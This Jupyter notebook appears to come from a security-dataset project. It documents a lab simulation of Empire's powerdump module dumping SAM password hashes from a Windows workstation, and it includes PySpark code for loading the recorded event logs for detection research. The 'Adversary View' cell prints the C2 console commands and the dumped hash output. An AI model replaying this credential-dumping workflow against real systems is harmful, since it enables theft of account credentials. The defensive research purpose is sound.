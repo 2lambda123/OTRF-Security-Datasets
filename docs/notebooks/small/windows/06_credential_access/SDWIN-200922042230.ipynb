{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "9bfb1606",
   "metadata": {},
   "source": [
    "# Empire Powerdump Extract Hashes"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a2f4da62",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "02e9c4c7",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/09/22 |\n",
    "| Modification Date | 2020/09/22 |\n",
    "| Tactics           | ['[TA0006](https://attack.mitre.org/tactics/TA0006)'] |\n",
    "| Techniques        | ['[T1003.002](https://attack.mitre.org/techniques/T1003/002)'] |\n",
    "| Tags              | ['Calculating SysKey', 'SAM Read'] |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0cd209df",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries calculating the SysKey to decrypt Security Account Mannager (SAM) database entries (from registry or hive) and get NTLM, and sometimes LM hashes of local accounts password."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f95ec38f",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "28ae0a24",
   "metadata": {},
   "source": [
    "\n",
    "| Dataset Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/small/windows/credential_access/host/empire_powerdump_sam_access.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/small/windows/credential_access/host/empire_powerdump_sam_access.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4c6c4fa3",
   "metadata": {},
   "source": [
    "## Notebooks\n",
    "Notebooks created by the community leveraging the mordor datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9e9dabfd",
   "metadata": {},
   "source": [
    "\n",
    "| Author | Name | Link |\n",
    "|:-------|:-----|:-----|"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "09d0f330",
   "metadata": {},
   "source": [
    "## Simulation Plan"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d7a5a414",
   "metadata": {},
   "source": [
    "\n",
    "| Environment | Tool Type | Module |\n",
    "|:------------|:----------|:-------|\n",
    "| Mordor shire | C2 | [powerdump](https://github.com/OTRF/Blacksmith/blob/master/aws/Security-Datasets/cfn-files/scripts/Invoke-Mimikatz.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "62943e95",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: powershell/credentials/mimikatz/sam) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "WE8XYD3K ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5972   5/0.0    2020-09-22 08:21:35  http            \n",
    "\n",
    "(Empire: agents) > interact WE8XYD3K\n",
    "(Empire: WE8XYD3K) > usemodule credentials/powerdump*\n",
    "(Empire: powershell/credentials/powerdump) > info\n",
    "\n",
    "              Name: Invoke-PowerDump\n",
    "            Module: powershell/credentials/powerdump\n",
    "        NeedsAdmin: True\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  DarkOperator\n",
    "  winfang\n",
    "  Kathy Peters\n",
    "  ReL1K\n",
    "\n",
    "Description:\n",
    "  Dumps hashes from the local system using Posh-SecMod's\n",
    "  Invoke-PowerDump\n",
    "\n",
    "Comments:\n",
    "  https://github.com/darkoperator/Posh-\n",
    "  SecMod/blob/master/PostExploitation/PostExploitation.psm1\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name  Required    Value                     Description\n",
    "  ----  --------    -------                   -----------\n",
    "  Agent True        WE8XYD3K                  Agent to run module on.                 \n",
    "\n",
    "(Empire: powershell/credentials/powerdump) > execute\n",
    "[*] Tasked WE8XYD3K to run TASK_CMD_JOB\n",
    "[*] Agent WE8XYD3K tasked with task ID 4\n",
    "[*] Tasked agent WE8XYD3K to run module powershell/credentials/powerdump\n",
    "(Empire: powershell/credentials/powerdump) > \n",
    "Job started: TASK2D\n",
    "\n",
    "wardog:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n",
    "Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n",
    "DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n",
    "\n",
    "(Empire: powershell/credentials/powerdump) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6c6fff48",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "646a37ec",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "04962c80",
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5c302fe9",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "86a85eab",
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/small/windows/credential_access/host/empire_powerdump_sam_access.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8e3b73b4",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "65be0a92",
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT Hostname,Channel,EventID, Count(*) as count\n",
    "FROM mordorTable\n",
    "GROUP BY Hostname,Channel,EventID\n",
    "ORDER BY count DESC\n",
    "'''\n",
    ")\n",
    "df.show(truncate=False)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
